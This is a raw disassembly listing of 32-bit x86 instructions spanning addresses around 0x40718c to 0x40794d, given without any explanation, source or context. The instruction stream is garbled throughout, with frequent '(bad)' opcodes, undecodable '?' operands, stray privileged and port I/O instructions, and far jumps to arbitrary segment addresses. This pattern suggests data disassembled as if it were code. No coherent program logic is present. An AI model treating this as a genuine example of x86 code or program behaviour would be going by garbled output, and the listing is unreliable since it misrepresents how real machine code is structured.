  40718c:	or     DWORD PTR [edi+0x14],0xffffff93
  407190:	xchg   esi,eax
  407191:	data16 arpl ax,di
  407194:	fsubr  QWORD PTR [ebp+0x2c]
  407197:	lods   al,BYTE PTR ds:[esi]
  407198:	nop
  407199:	inc    ebx
  40719a:	lods   eax,DWORD PTR ds:[esi]
  40719b:	xchg   ebx,eax
  40719c:	ins    BYTE PTR es:[edi],dx
  40719d:	cld    
  40719e:	cmp    esp,DWORD PTR [ebx-0x37]
  4071a1:	inc    esp
  4071a2:	mov    WORD PTR [ebp+0x6b],?
  4071a5:	push   ds
  4071a6:	xchg   ebp,eax
  4071a7:	jmp    0x4c3520f4
  4071ac:	fidiv  WORD PTR [edx]
  4071ae:	dec    esp
  4071af:	jae    0x407225
  4071b1:	(bad)  
  4071b2:	xchg   esp,eax
  4071b3:	sbb    DWORD PTR [edx],0x504ef80b
  4071b9:	dec    ecx
  4071ba:	jecxz  0x4071dd
  4071bc:	out    0xf8,eax
  4071be:	mov    edx,0xcd5372b1
  4071c3:	cli    
  4071c4:	sub    bl,bl
  4071c6:	xor    ah,ch
  4071c8:	xchg   esp,eax
  4071c9:	mov    esp,DWORD PTR [esi-0x23a5666]
  4071cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071d0:	lock adc eax,esp
  4071d3:	lahf   
  4071d4:	xchg   ebx,eax
  4071d5:	into   
  4071d6:	jno    0x407220
  4071d8:	int    0x9b
  4071da:	inc    esi
  4071db:	jns    0x4071bd
  4071dd:	and    eax,0xcc496104
  4071e2:	or     eax,0x98547a0d
  4071e7:	int    0x25
  4071e9:	and    ebp,DWORD PTR [edi+0x72]
  4071ec:	add    BYTE PTR [esi],bl
  4071ee:	lds    esp,FWORD PTR [eax+0x51]
  4071f1:	mov    BYTE PTR [ebx],ah
  4071f3:	jl     0x4071a0
  4071f5:	add    DWORD PTR [edi+0x76],esp
  4071f8:	ds lock add al,0x78
  4071fc:	xor    DWORD PTR [ebx],eax
  4071fe:	in     eax,0x73
  407200:	xor    DWORD PTR [ecx-0x26],eax
  407203:	out    0x4,al
  407205:	lods   al,BYTE PTR ds:[esi]
  407206:	sahf   
  407207:	loope  0x407228
  407209:	fiadd  WORD PTR [esi]
  40720b:	cmp    BYTE PTR [esi-0x300b4eb],ch
  407211:	cld    
  407212:	adc    bl,bh
  407214:	or     esi,eax
  407216:	cmp    eax,0xa8918cb4
  40721b:	push   edx
  40721c:	arpl   WORD PTR [esi+0x72],bp
  40721f:	iret   
  407220:	fwait
  407221:	xlat   BYTE PTR ds:[ebx]
  407222:	mov    al,0x7a
  407224:	pushf  
  407225:	pop    edi
  407226:	jge    0x4072a1
  407228:	sbb    eax,0xffffff84
  40722b:	mov    edx,0x4c9011e2
  407230:	cmp    DWORD PTR [eax+esi*4],0xffffff9e
  407234:	stos   BYTE PTR es:[edi],al
  407235:	dec    eax
  407236:	icebp  
  407237:	mov    bh,bl
  407239:	cmp    edi,DWORD PTR [eax+0x4385fca5]
  40723f:	aad    0xb4
  407241:	adc    BYTE PTR [edx+0x31],bh
  407244:	aam    0xac
  407246:	sahf   
  407247:	mov    ebp,0x8dfccff0
  40724c:	enter  0xcae6,0xc1
  407250:	and    BYTE PTR ds:0x4d2b6625,dl
  407256:	test   dh,dh
  407258:	(bad)  [edx]
  40725a:	xchg   ebx,eax
  40725b:	js     0x407298
  40725d:	push   edi
  40725e:	adc    eax,DWORD PTR [ebp-0x69aa2c1d]
  407264:	xor    BYTE PTR [edi+0x25],0x86
  407268:	pop    es
  407269:	mov    ecx,DWORD PTR [ebp-0xa6aea7a]
  40726f:	shl    BYTE PTR [edx],cl
  407271:	loope  0x407282
  407273:	rol    al,cl
  407275:	adc    ah,BYTE PTR [eax]
  407277:	(bad)  
  407278:	cli    
  407279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40727a:	fistp  QWORD PTR ds:0x43a69861
  407280:	mov    bh,0xcb
  407282:	dec    ebx
  407283:	jg     0x40720c
  407285:	jl     0x407273
  407287:	imul   ecx,DWORD PTR [edx-0x61],0x67
  40728b:	mov    ss,WORD PTR [eax+0x7e6e2a45]
  407291:	xchg   esi,eax
  407292:	mov    DWORD PTR [esi],edi
  407294:	shr    DWORD PTR [eax],1
  407296:	mov    al,0x22
  407298:	jmp    0x3763:0xeb3dd4e2
  40729f:	fs into 
  4072a1:	push   eax
  4072a2:	mov    ds:0xbbd0f4b0,eax
  4072a7:	inc    esp
  4072a8:	cmp    DWORD PTR [edx],edx
  4072aa:	pop    esi
  4072ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072ac:	add    DWORD PTR [eax-0x758b10d1],eax
  4072b2:	add    bl,BYTE PTR [esp+eax*4]
  4072b5:	lds    eax,FWORD PTR [ebx-0x76]
  4072b8:	add    bh,ah
  4072ba:	popf   
  4072bb:	dec    edi
  4072bc:	test   dl,dh
  4072be:	mov    dl,0x9f
  4072c0:	add    bl,al
  4072c2:	dec    edx
  4072c3:	inc    esp
  4072c4:	pop    esi
  4072c5:	sub    eax,0xafeed008
  4072ca:	out    0x26,eax
  4072cc:	jl     0x407310
  4072ce:	xchg   DWORD PTR [eax-0x628efe6],eax
  4072d4:	fist   WORD PTR [eax+0x7247b957]
  4072da:	pushf  
  4072db:	xchg   ebx,eax
  4072dc:	xor    DWORD PTR [ecx],ebp
  4072de:	push   esi
  4072df:	push   ecx
  4072e0:	dec    eax
  4072e1:	fisub  DWORD PTR [ebx]
  4072e3:	mov    esp,ecx
  4072e5:	jmp    0x4072b6
  4072e7:	mov    edx,0x121e124a
  4072ec:	ja     0x407360
  4072ee:	xchg   esp,eax
  4072ef:	je     0x40730c
  4072f1:	mov    dh,0x2e
  4072f3:	xor    al,0x58
  4072f5:	pop    edx
  4072f6:	push   cs
  4072f7:	shl    BYTE PTR [ecx],0x12
  4072fa:	sbb    eax,0x6f31da35
  4072ff:	loope  0x4072a3
  407301:	inc    edi
  407302:	(bad)  
  407303:	inc    esi
  407304:	fistp  DWORD PTR [eax+ebx*4]
  407307:	fcom   QWORD PTR [eax+ebp*1-0x4364f331]
  40730e:	jg     0x40733e
  407310:	test   ah,ch
  407312:	mov    dl,0x22
  407314:	pop    edx
  407315:	shr    DWORD PTR [ebx+0x5d],cl
  407318:	shl    ecx,1
  40731a:	loope  0x4072da
  40731c:	ins    DWORD PTR es:[edi],dx
  40731d:	es cli 
  40731f:	jbe    0x407393
  407321:	icebp  
  407322:	test   edi,ebp
  407324:	fmul   QWORD PTR [edi]
  407326:	(bad)  
  407327:	stc    
  407328:	adc    eax,0xbf8847a1
  40732d:	or     BYTE PTR [edx+0x40],cl
  407330:	in     eax,dx
  407331:	pop    ecx
  407332:	popa   
  407333:	pop    ds
  407334:	dec    bl
  407336:	or     al,0xf7
  407338:	jl     0x4072c4
  40733a:	lods   al,BYTE PTR ds:[esi]
  40733b:	jmp    0xc6e9:0x89c7cb0
  407342:	jecxz  0x407369
  407344:	jo     0x40734f
  407346:	xchg   ebx,eax
  407347:	mov    eax,ds:0xea5a359f
  40734c:	jne    0x407313
  40734e:	retf   
  40734f:	jb     0x407356
  407351:	dec    ebp
  407352:	fdiv   DWORD PTR [edi-0x35]
  407355:	sbb    eax,0x9662922c
  40735a:	cmp    eax,0x96cff507
  40735f:	outs   dx,DWORD PTR ds:[esi]
  407360:	jb     0x407309
  407362:	or     al,0x58
  407364:	out    0x95,al
  407366:	stos   BYTE PTR es:[edi],al
  407367:	push   ecx
  407368:	push   ecx
  407369:	jne    0x40738b
  40736b:	mul    DWORD PTR [ecx-0x2b]
  40736e:	ror    BYTE PTR [esi+eax*1],cl
  407371:	sub    dh,BYTE PTR [edx+ecx*8-0x61]
  407375:	sbb    esi,DWORD PTR [esi+0x51]
  407378:	sbb    eax,0x71316278
  40737d:	mov    ?,WORD PTR [ecx]
  40737f:	rol    DWORD PTR [edx-0x40dd2c68],cl
  407385:	push   edi
  407386:	pop    ds
  407387:	xor    al,ah
  407389:	mov    dl,0x58
  40738b:	pusha  
  40738c:	mov    edx,0xf6e89f50
  407391:	add    ebx,esp
  407393:	test   eax,0x67d470d8
  407398:	popa   
  407399:	(bad)  
  40739a:	dec    edi
  40739b:	add    eax,0xade684e2
  4073a0:	cmp    DWORD PTR [ebx-0x3a],ecx
  4073a3:	adc    BYTE PTR [ebx-0x4c],ch
  4073a6:	inc    ecx
  4073a7:	pop    es
  4073a8:	adc    DWORD PTR [esi+0x3df682a8],esi
  4073ae:	cdq    
  4073af:	add    BYTE PTR [eax],cl
  4073b1:	dec    esi
  4073b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073b3:	mov    eax,0x7a3f5b4a
  4073b8:	retf   
  4073b9:	dec    ebx
  4073ba:	nop
  4073bb:	lods   eax,DWORD PTR ds:[esi]
  4073bc:	or     ch,BYTE PTR [edi+0x7aaaa18]
  4073c2:	sar    edx,0xa0
  4073c5:	rol    BYTE PTR [ebp-0x2e],0x99
  4073c9:	or     DWORD PTR [edi+ebx*2+0x1afea8ac],0x2b447744
  4073d4:	int    0x1e
  4073d6:	loope  0x4073f5
  4073d8:	dec    eax
  4073d9:	push   0x6e
  4073db:	and    BYTE PTR [ebp-0x369ce6d2],ch
  4073e1:	stos   BYTE PTR es:[edi],al
  4073e2:	push   edx
  4073e3:	rcr    DWORD PTR [ebx],cl
  4073e5:	or     eax,0x6cf0c05a
  4073ea:	mov    ah,BYTE PTR [ebx+0x24]
  4073ed:	jge    0x407380
  4073ef:	pop    esi
  4073f0:	icebp  
  4073f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f2:	out    dx,al
  4073f3:	push   edx
  4073f4:	enter  0x6061,0x61
  4073f8:	xor    al,0xe4
  4073fa:	push   es
  4073fb:	fmul   st(1),st
  4073fd:	cmp    DWORD PTR [ebx-0x793b8b9d],ecx
  407403:	xor    al,0x18
  407405:	push   0xffffffa5
  407407:	icebp  
  407408:	xor    eax,edx
  40740a:	bound  esi,QWORD PTR [esi]
  40740c:	cwde   
  40740d:	mov    sp,0x1bb8
  407411:	jmp    0x67261d64
  407416:	imul   edx,edi,0x1f
  407419:	push   edx
  40741a:	sub    BYTE PTR [edx],ch
  40741c:	dec    edx
  40741d:	icebp  
  40741e:	(bad)  
  40741f:	mov    edx,0xc6fc623e
  407424:	rol    DWORD PTR [edx+0x5e],0x2e
  407428:	fild   WORD PTR [eax]
  40742a:	call   0x911576d4
  40742f:	push   ebx
  407430:	dec    ebx
  407431:	repz dec ecx
  407433:	mov    ds:0xbd9ffd8d,al
  407438:	cli    
  407439:	jae    0x40746e
  40743b:	pop    ebx
  40743c:	and    al,0xcf
  40743e:	xchg   ebx,eax
  40743f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407440:	dec    ecx
  407441:	(bad)  
  407442:	mov    al,ds:0x78afd184
  407447:	mov    ds:0x90e9d113,eax
  40744c:	in     eax,dx
  40744d:	push   eax
  40744e:	xor    al,0x46
  407450:	mov    ecx,0x858131a9
  407455:	jmp    0xa099:0x1170d6aa
  40745c:	out    dx,al
  40745d:	or     DWORD PTR [esp+esi*2],esi
  407460:	ficom  WORD PTR [ebx+0x6ef63bf2]
  407466:	mov    DWORD PTR [ebx-0x6],ebx
  407469:	ss jp  0x4074a2
  40746c:	push   ebx
  40746d:	loop   0x407439
  40746f:	cs in  al,0x4
  407472:	jle    0x4074eb
  407474:	adc    eax,0x596e5530
  407479:	xchg   edx,eax
  40747a:	jo     0x40741a
  40747c:	and    al,0x15
  40747e:	sub    edi,DWORD PTR [esp+ebx*4]
  407481:	das    
  407482:	cmp    edi,DWORD PTR [esi-0x9]
  407485:	test   eax,0x6d9251d1
  40748a:	sub    cl,BYTE PTR [ecx]
  40748c:	mov    ebp,0xbb2ce94d
  407491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407492:	add    al,BYTE PTR [edi]
  407494:	jecxz  0x4074fd
  407496:	aas    
  407497:	mov    ds:0x3a49579a,al
  40749c:	sbb    bh,cl
  40749e:	ss fadd st,st(0)
  4074a1:	sub    dh,0x2c
  4074a4:	sub    DWORD PTR fs:[edx+0xa03f076],esi
  4074ab:	sub    al,BYTE PTR ds:0xbd3e5599
  4074b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b2:	mov    al,0xce
  4074b4:	in     eax,0xbf
  4074b6:	aam    0x2e
  4074b8:	loope  0x407440
  4074ba:	(bad)  
  4074bb:	aad    0x8f
  4074bd:	mov    edi,gs
  4074bf:	jo     0x407535
  4074c1:	lahf   
  4074c2:	adc    ah,dh
  4074c4:	std    
  4074c5:	lds    edi,FWORD PTR [edx+0xc]
  4074c8:	adc    edi,DWORD PTR [ecx-0x341bd419]
  4074ce:	iret   
  4074cf:	mov    edi,ds
  4074d1:	mov    eax,DWORD PTR [esi+0x149d707d]
  4074d7:	je     0x407511
  4074d9:	sub    esi,DWORD PTR [edi+esi*2-0x7bb00579]
  4074e0:	jg     0x407550
  4074e2:	xlat   BYTE PTR ds:[ebx]
  4074e3:	scas   eax,DWORD PTR es:[edi]
  4074e4:	(bad)  
  4074e5:	lods   al,BYTE PTR ds:[esi]
  4074e6:	(bad)  
  4074e7:	outs   dx,BYTE PTR ds:[esi]
  4074e8:	pop    ds
  4074e9:	adc    ecx,ebx
  4074eb:	xor    BYTE PTR [edi+0x7a3ca1c],bl
  4074f1:	push   0x239c78e5
  4074f6:	(bad)  
  4074f7:	mov    ?,WORD PTR [edi-0x2f]
  4074fa:	cmp    edi,DWORD PTR [edi-0x77321559]
  407500:	push   esp
  407501:	aad    0xc6
  407503:	in     eax,dx
  407504:	(bad)  
  407505:	popf   
  407506:	pop    esp
  407507:	mov    al,0xa4
  407509:	push   edx
  40750a:	out    0xff,al
  40750c:	push   eax
  40750d:	dec    ecx
  40750e:	xchg   ebx,eax
  40750f:	add    al,BYTE PTR [edi]
  407511:	mov    eax,0x4860a16a
  407516:	gs das 
  407518:	lock (bad) 
  40751b:	cmc    
  40751c:	inc    edi
  40751d:	call   0xfa7c:0xae8e0301
  407524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407525:	or     al,0x56
  407527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407529:	pop    esp
  40752a:	pop    esi
  40752b:	push   esi
  40752c:	pop    edx
  40752d:	dec    edi
  40752e:	outs   dx,BYTE PTR es:[esi]
  407530:	cwde   
  407531:	sub    al,0x85
  407533:	push   esp
  407534:	adc    al,0x67
  407536:	(bad)
  40753a:	push   edx
  40753b:	adc    al,0x53
  40753d:	sub    eax,0x52601e13
  407542:	mov    bh,0x21
  407544:	inc    eax
  407545:	jmp    0xd38b:0xf1681cc7
  40754c:	shl    esp,1
  40754e:	pop    ss
  40754f:	xchg   ecx,eax
  407550:	ss xor al,0xfe
  407553:	test   eax,0x80b768fa
  407558:	mov    BYTE PTR [esp+ecx*1-0x6457f1a4],0x41
  407560:	popa   
  407561:	pop    eax
  407562:	xor    al,0x18
  407564:	mov    al,ds:0x73db7ce8
  407569:	ds push es
  40756b:	in     eax,dx
  40756c:	int    0x27
  40756e:	push   ecx
  40756f:	ja     0x407505
  407571:	jo     0x407571
  407573:	fxch   st(4)
  407575:	mov    ebx,0x7a248c56
  40757a:	scas   al,BYTE PTR es:[edi]
  40757b:	loop   0x4075db
  40757d:	pop    edi
  40757e:	add    BYTE PTR [ebp+0x3c057595],0xef
  407585:	shr    BYTE PTR [edx+0x3600f1fe],cl
  40758b:	xor    eax,0xefcce497
  407590:	xchg   esi,eax
  407591:	jno    0x407544
  407593:	xchg   edi,eax
  407594:	xchg   edx,eax
  407595:	out    dx,eax
  407596:	inc    esi
  407597:	push   edx
  407598:	inc    eax
  407599:	in     al,0x7
  40759b:	arpl   WORD PTR [eiz*8-0x4682f8ee],dx
  4075a2:	pushf  
  4075a3:	push   ds
  4075a4:	stos   DWORD PTR es:[edi],eax
  4075a5:	jo     0x4075dc
  4075a7:	xchg   edi,eax
  4075a8:	dec    edx
  4075a9:	(bad)  
  4075ab:	cwde   
  4075ac:	pusha  
  4075ad:	rcr    BYTE PTR [ecx-0x76e91518],1
  4075b3:	call   0x5351e419
  4075b8:	add    bl,cl
  4075ba:	pop    edi
  4075bb:	sub    al,0x6
  4075bd:	leave  
  4075be:	sub    al,0xad
  4075c0:	inc    edi
  4075c1:	test   DWORD PTR [ebp+0x277f9524],edx
  4075c7:	outs   dx,BYTE PTR ds:[esi]
  4075c8:	call   0x9ac4:0xbc97ee1c
  4075cf:	mov    al,ah
  4075d1:	pop    es
  4075d2:	mov    ecx,0x92ed3196
  4075d7:	add    BYTE PTR ds:[edi],bh
  4075da:	aaa    
  4075db:	loopne 0x40757c
  4075dd:	int3   
  4075de:	arpl   si,sp
  4075e0:	lahf   
  4075e1:	das    
  4075e2:	push   esi
  4075e3:	clc    
  4075e4:	ror    DWORD PTR [edi-0x5fe8571d],0x24
  4075eb:	outs   dx,DWORD PTR ds:[esi]
  4075ec:	adc    esi,DWORD PTR [esi-0x56]
  4075ef:	pop    ss
  4075f0:	sbb    ebx,0xfb47bbac
  4075f6:	aad    0x44
  4075f8:	cdq    
  4075f9:	in     al,0x96
  4075fb:	mov    eax,ds:0x2ddd57da
  407600:	loopne 0x40761b
  407602:	loop   0x407600
  407604:	idiv   DWORD PTR [edx+ebx*1+0x6a]
  407608:	jle    0x4075a6
  40760a:	jo     0x4075e0
  40760c:	outs   dx,BYTE PTR ds:[esi]
  40760d:	loopne 0x4075dc
  40760f:	dec    edi
  407610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407611:	mov    ah,BYTE PTR [esi]
  407613:	cwde   
  407614:	mov    al,0x9f
  407616:	bound  edi,QWORD PTR [ecx]
  407618:	jbe    0x4075d0
  40761a:	inc    esi
  40761b:	in     al,0xd8
  40761d:	push   ebp
  40761e:	mov    WORD PTR [esi+0x4351d1ac],fs
  407624:	pop    eax
  407625:	ror    BYTE PTR [edx],0x5d
  407628:	xchg   esi,eax
  407629:	hlt    
  40762a:	push   ss
  40762b:	mov    esi,0x275a088b
  407630:	popf   
  407631:	push   edx
  407632:	aad    0xec
  407634:	mov    dl,0x9b
  407636:	js     0x4075f3
  407638:	(bad)  [ebp+0x3b]
  40763b:	clc    
  40763c:	dec    eax
  40763d:	ja     0x407621
  40763f:	adc    BYTE PTR [eax+ebp*8],ch
  407642:	loopne 0x407608
  407644:	stc    
  407645:	sbb    eax,0x6b185b96
  40764a:	jmp    0x4bed6d48
  40764f:	inc    edi
  407650:	data16 mov dh,0x8e
  407653:	lahf   
  407654:	add    cl,BYTE PTR [edx-0x3c]
  407657:	jbe    0x4076c7
  407659:	pop    esp
  40765a:	es out dx,eax
  40765c:	adc    DWORD PTR [esi-0x52bad1ad],ecx
  407662:	or     edx,DWORD PTR ds:0x3c1dbd35
  407668:	mov    ds:0xca862d4f,al
  40766d:	sub    ecx,DWORD PTR [eax]
  40766f:	(bad)  
  407670:	retf   0x57f
  407673:	aaa    
  407674:	add    ch,BYTE PTR [edi*4+0x4d43a85e]
  40767b:	and    BYTE PTR es:[ecx-0x38bd0639],bh
  407682:	push   esp
  407683:	or     edx,DWORD PTR ds:0x16fcf400
  407689:	xchg   edi,eax
  40768a:	pinsrw mm2,edx,0xbf
  40768e:	cmc    
  40768f:	loop   0x407628
  407691:	inc    esi
  407692:	or     BYTE PTR [ebx-0x5c5974d3],0x50
  407699:	add    BYTE PTR [ecx-0x7111eefb],bh
  40769f:	(bad)  
  4076a0:	hlt    
  4076a1:	nop
  4076a2:	mov    ebx,0xe871e38e
  4076a7:	mov    al,ds:0x90e23c7
  4076ac:	adc    al,ch
  4076ae:	arpl   WORD PTR [ebx+esi*8+0x5],si
  4076b2:	cmp    DWORD PTR [ebx+0xe],ebp
  4076b5:	sbb    eax,0x2c9df6f7
  4076ba:	(bad)  
  4076bb:	and    ch,bh
  4076bd:	(bad)  
  4076be:	call   0x7568:0x43a6afee
  4076c5:	stc    
  4076c6:	inc    esp
  4076c7:	bound  edi,QWORD PTR ds:0x1f3aab1a
  4076cd:	les    esp,FWORD PTR [esi-0x30]
  4076d0:	adc    al,0xb6
  4076d2:	ret    
  4076d3:	inc    edx
  4076d4:	scas   al,BYTE PTR es:[edi]
  4076d5:	cmp    DWORD PTR [ebp*2+0x76a999c4],esi
  4076dc:	in     al,dx
  4076dd:	fcomip st,st(3)
  4076df:	enter  0x7e87,0xcc
  4076e3:	es pop esp
  4076e5:	enter  0x5bb2,0xd0
  4076e9:	(bad)  
  4076ea:	int3   
  4076eb:	adc    ebx,DWORD PTR [ecx+0x616ec415]
  4076f1:	ret    
  4076f2:	in     al,0xf
  4076f4:	and    al,bl
  4076f6:	cdq    
  4076f7:	fimul  DWORD PTR [esi+ebp*1-0x44]
  4076fb:	cmp    BYTE PTR ds:0x7940360c,dh
  407701:	mov    ah,0xa8
  407703:	cmp    eax,esp
  407705:	cmp    DWORD PTR [eax-0x5e],esp
  407708:	arpl   WORD PTR [ebx+0x4d],sp
  40770b:	jnp    0x4076be
  40770d:	pop    ds
  40770e:	es xchg esp,eax
  407710:	mov    cl,0xcc
  407712:	inc    edx
  407713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407714:	dec    edi
  407715:	push   ds
  407716:	ins    BYTE PTR es:[edi],dx
  407717:	call   0x4ecc:0xc833917b
  40771e:	and    DWORD PTR gs:[esi-0x77d57907],ebx
  407725:	les    edx,FWORD PTR [ebx]
  407727:	daa    
  407728:	fisttp QWORD PTR [esp+edx*2-0x37]
  40772c:	or     BYTE PTR [ebx+0x19],dl
  40772f:	jecxz  0x4076b4
  407731:	(bad)  
  407732:	repnz mov ebp,0x9132b5c8
  407738:	and    ecx,ebp
  40773a:	push   es
  40773b:	push   eax
  40773c:	adc    DWORD PTR [edx+0x1711e07],0x64
  407743:	in     al,dx
  407744:	mov    al,ds:0x93e3ec63
  407749:	jmp    0x4076db
  40774b:	sar    BYTE PTR [esi+0x5ecd82f],1
  407751:	out    dx,eax
  407752:	push   esi
  407753:	test   eax,ebx
  407755:	add    BYTE PTR [esi-0x5c],cl
  407758:	jge    0x40779f
  40775a:	xor    al,0x46
  40775c:	out    dx,eax
  40775d:	sahf   
  40775e:	(bad)  
  40775f:	popa   
  407760:	jmp    0x19e6:0x5bd8483
  407767:	push   ebx
  407768:	xchg   edi,ecx
  40776a:	adc    DWORD PTR [edx],eax
  40776c:	xchg   edx,eax
  40776d:	mov    ecx,esp
  40776f:	mov    ds:0xc5dd826b,al
  407774:	push   ecx
  407775:	xor    al,0xbf
  407777:	call   FWORD PTR [ecx-0x60]
  40777a:	dec    ebp
  40777b:	push   esp
  40777c:	lds    edi,FWORD PTR [edx]
  40777e:	pop    ecx
  40777f:	push   ebp
  407780:	add    bh,cl
  407782:	jo     0x4077c3
  407784:	jecxz  0x40775b
  407786:	div    DWORD PTR [ebx]
  407788:	cmp    bh,cl
  40778a:	jp     0x4077c6
  40778c:	pop    ds
  40778d:	not    BYTE PTR [ebx]
  40778f:	xor    ch,BYTE PTR [eax]
  407791:	jmp    0x4077a4
  407793:	push   edi
  407794:	push   es
  407795:	ins    DWORD PTR es:[edi],dx
  407796:	jp     0x4077a5
  407798:	outs   dx,BYTE PTR ds:[esi]
  407799:	lahf   
  40779a:	icebp  
  40779b:	cmp    dh,dh
  40779d:	inc    edi
  40779e:	int3   
  40779f:	push   0x5e
  4077a1:	mov    esp,eax
  4077a3:	pop    ebx
  4077a4:	add    al,BYTE PTR [ecx]
  4077a6:	xlat   BYTE PTR ds:[ebx]
  4077a7:	mov    edx,0xde1a482
  4077ac:	cmp    ah,dl
  4077ae:	loop   0x4077fa
  4077b0:	maxps  xmm5,XMMWORD PTR [ebp+0x1b3d0975]
  4077b7:	jns    0x40776a
  4077b9:	add    al,0x85
  4077bb:	cdq    
  4077bc:	rcl    DWORD PTR [ecx+0x9],cl
  4077bf:	inc    ebp
  4077c0:	adc    DWORD PTR [ebp-0x16452698],esi
  4077c6:	or     al,0xab
  4077c8:	and    edi,DWORD PTR [edx-0x43]
  4077cb:	pop    ebp
  4077cc:	adc    esp,ebx
  4077ce:	push   esi
  4077cf:	mov    dl,0x2b
  4077d1:	push   es
  4077d2:	(bad)  
  4077d3:	outs   dx,BYTE PTR ds:[esi]
  4077d4:	adc    BYTE PTR [edx-0x19],dh
  4077d7:	iret   
  4077d8:	push   cs
  4077d9:	mov    eax,ds:0x91f539ff
  4077de:	mov    bl,0x1f
  4077e0:	mov    edx,edx
  4077e2:	and    BYTE PTR [ecx],bl
  4077e4:	out    0x44,al
  4077e6:	in     eax,0x26
  4077e8:	pop    es
  4077e9:	js     0x40778f
  4077eb:	push   0x3e89566e
  4077f0:	lock jbe 0x407794
  4077f3:	and    dl,dl
  4077f5:	stc    
  4077f6:	mov    cl,0x76
  4077f8:	loope  0x407855
  4077fa:	dec    eax
  4077fb:	test   BYTE PTR [eax+0x79],dl
  4077fe:	out    dx,al
  4077ff:	or     esi,DWORD PTR [edx]
  407801:	pop    ecx
  407802:	test   al,0x7e
  407804:	mov    edi,0xfb60630c
  407809:	out    0x7a,al
  40780b:	jbe    0x40784c
  40780d:	call   0x66d2e877
  407812:	push   es
  407813:	fwait
  407814:	and    al,0x39
  407816:	mov    bl,0xd3
  407818:	pop    ebp
  407819:	stos   DWORD PTR es:[edi],eax
  40781a:	sar    ebp,0x11
  40781d:	call   0x8043:0xe4d47b42
  407824:	in     eax,dx
  407825:	jmp    0x407897
  407827:	test   edi,0xac1aaefe
  40782d:	mov    edx,0xaa207ee
  407832:	push   ecx
  407833:	fimul  WORD PTR [eax-0x69]
  407836:	loop   0x40788f
  407838:	mov    ebx,0x77fbcf1e
  40783d:	jno    0x407879
  40783f:	pop    ecx
  407840:	jnp    0x4078b2
  407842:	mov    ebx,0x661dda12
  407847:	aam    0x15
  407849:	std    
  40784a:	lods   al,BYTE PTR ds:[esi]
  40784b:	adc    DWORD PTR [eax+ecx*2-0x27ca0da9],ebp
  407852:	call   0x59b85dfa
  407857:	mov    dl,0x7d
  407859:	or     bh,ah
  40785b:	not    BYTE PTR [edi+0x1db3a176]
  407861:	mov    esi,0x176a1c9e
  407866:	dec    ebp
  407867:	push   ebx
  407868:	jle    0x4077ef
  40786a:	add    DWORD PTR [ecx+0x783d3e8d],edi
  407870:	mov    ch,0x27
  407872:	mov    eax,0x3f59f02
  407877:	daa    
  407878:	pushw  0xb307
  40787c:	std    
  40787d:	mov    eax,ds:0xf18384d9
  407882:	mov    ds:0xc8acce0f,al
  407887:	arpl   WORD PTR [edi-0x5c60b35c],ax
  40788d:	repz dec ebp
  40788f:	(bad)  
  407890:	cmp    al,ch
  407892:	pop    edi
  407893:	push   ebx
  407894:	sbb    bh,al
  407896:	hlt    
  407897:	fcomp  st(1)
  407899:	xor    dl,al
  40789b:	inc    edi
  40789c:	jbe    0x407862
  40789e:	outs   dx,DWORD PTR ds:[esi]
  40789f:	sub    al,0x6e
  4078a1:	ds icebp 
  4078a3:	ins    BYTE PTR es:[edi],dx
  4078a4:	nop
  4078a5:	jmp    0x407848
  4078a7:	(bad)
  4078aa:	aaa    
  4078ab:	mov    WORD PTR [edi-0x19],?
  4078ae:	pop    edx
  4078af:	test   al,0x8b
  4078b1:	sahf   
  4078b2:	add    DWORD PTR [ecx-0x7b617de4],0x23
  4078b9:	push   es
  4078ba:	inc    ebx
  4078bb:	outs   dx,DWORD PTR ds:[esi]
  4078bc:	fiadd  WORD PTR [esi]
  4078be:	(bad)  
  4078c0:	or     BYTE PTR [ecx-0x204ec9c7],bh
  4078c6:	test   eax,0xd1e94a75
  4078cb:	add    BYTE PTR [esi],dh
  4078cd:	jmp    0x595f:0xa586de97
  4078d4:	(bad)  
  4078d5:	retf   
  4078d6:	test   DWORD PTR [ebx],0xaaa8a7e0
  4078dc:	jns    0x4078be
  4078de:	cmp    esp,ebp
  4078e0:	test   BYTE PTR [ecx+0x6d],bh
  4078e3:	lahf   
  4078e4:	push   0xffffffcc
  4078e6:	mulps  xmm7,XMMWORD PTR [eax]
  4078e9:	push   esp
  4078ea:	loope  0x4078a2
  4078ec:	fs call 0x92e5:0xc8bd7cd1
  4078f4:	jmp    0x4078b6
  4078f6:	pop    ebx
  4078f7:	fsub   QWORD PTR [eax-0x65b01af8]
  4078fd:	mov    esi,esp
  4078ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407900:	pop    esi
  407901:	es sbb DWORD PTR fs:[ecx+0x50],eax
  407906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407907:	test   al,0xc7
  407909:	clc    
  40790a:	ret    0x329c
  40790d:	push   esp
  40790e:	and    DWORD PTR [ebx],ecx
  407910:	inc    ecx
  407911:	daa    
  407912:	ss mov cl,0x2d
  407915:	loop   0x407908
  407917:	xor    DWORD PTR ds:0x987d173f,ebx
  40791d:	retf   0x6f21
  407920:	mov    eax,ds:0x769728a7
  407925:	ds std 
  407927:	retf   0xae2c
  40792a:	pop    esp
  40792b:	aaa    
  40792c:	adc    dh,BYTE PTR ds:0x969d9430
  407932:	cwde   
  407933:	cli    
  407934:	push   cs
  407935:	mov    al,0x56
  407937:	add    BYTE PTR [ebx],bl
  407939:	mov    dh,0x49
  40793b:	jg     0x4078ea
  40793d:	jp     0x4078f2
  40793f:	retf   
  407940:	(bad)  
  407942:	cwde   
  407943:	das    
  407944:	arpl   bp,di
  407946:	out    0x4,eax
  407948:	sbb    eax,0xf246912f
  40794d:	lds    ebp,FWORD PTR [eax-0x1c]
